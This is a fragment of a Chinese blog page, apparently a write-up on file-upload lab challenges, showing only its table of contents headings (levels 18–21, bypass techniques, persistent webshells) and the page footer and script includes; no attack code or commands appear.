class="toc-number">1.1.5.2.</span> <span class="toc-text">关卡十八</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E5%8D%A1%E5%8D%81%E4%B9%9D"><span class="toc-number">1.1.5.3.</span> <span class="toc-text">关卡十九</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3"><span class="toc-number">1.1.5.4.</span> <span class="toc-text">第二十关</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%B8%80-2"><span class="toc-number">1.1.5.4.1.</span> <span class="toc-text">姿势一</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%BA%8C-3"><span class="toc-number">1.1.5.4.2.</span> <span class="toc-text">姿势二</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%B8%89"><span class="toc-number">1.1.5.4.3.</span> <span class="toc-text">姿势三</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E5%9B%9B"><span class="toc-number">1.1.5.4.4.</span> <span class="toc-text">姿势四</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%BA%94"><span class="toc-number">1.1.5.4.5.</span> <span class="toc-text">姿势五</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E5%85%B3"><span class="toc-number">1.1.5.5.</span> <span class="toc-text">第二十一关</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">上传总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Bypass"><span class="toc-number">3.</span> <span class="toc-text">文件上传Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%A2%E5%87%BA"><span class="toc-number">3.0.1.</span> <span class="toc-text">溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%85%B6%E4%BB%96%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87"><span class="toc-number">3.0.2.</span> <span class="toc-text">使用其他标签绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">3.0.3.</span> <span class="toc-text">其他绕过方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E6%AD%BB%E9%A9%AC"><span class="toc-number">3.0.4.</span> <span class="toc-text">不死马</span></a></li></ol></li></ol></li></ol>
+        </nav>
+    </div>
+</aside>
+
+
+
+
+
+        </section>
+        <footer class="hidden lg:block fixed bottom-0 left-0 sm:w-1/12 lg:w-1/6 bg-gray-100 z-40">
+    
+    <div class="footer-social-links">
+        
+            <a target="_blank" rel="noopener" href="https://github.com/h00ls">
+                <i class="iconfont icon-github"></i>
+            </a>
+        
+            <a href="/atom.xml">
+                <i class="iconfont icon-rss"></i>
+            </a>
+        
+    </div>
+    
+    
+</footer>
+
+        <div id="mask" class="hidden mask fixed inset-0 bg-gray-900 opacity-75 z-40"></div>
+        <div id="search-view-container" class="hidden shadow-xl"></div>
+        
+<script src="/js/dom-event.min.js"></script>
+
+<script src="//cdn.jsdelivr.net/npm/yox@1.0.0-alpha.121/dist/standard/prod/yox.min.js"></script>
+
+
+<script src="/js/search.min.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/lightgallery.js@1.1.3/dist/js/lightgallery.min.js"></script>
+    
+<script src="/js/light-gallery.min.js"></script>
+
+
+
+
+
+    </body>
+</html>
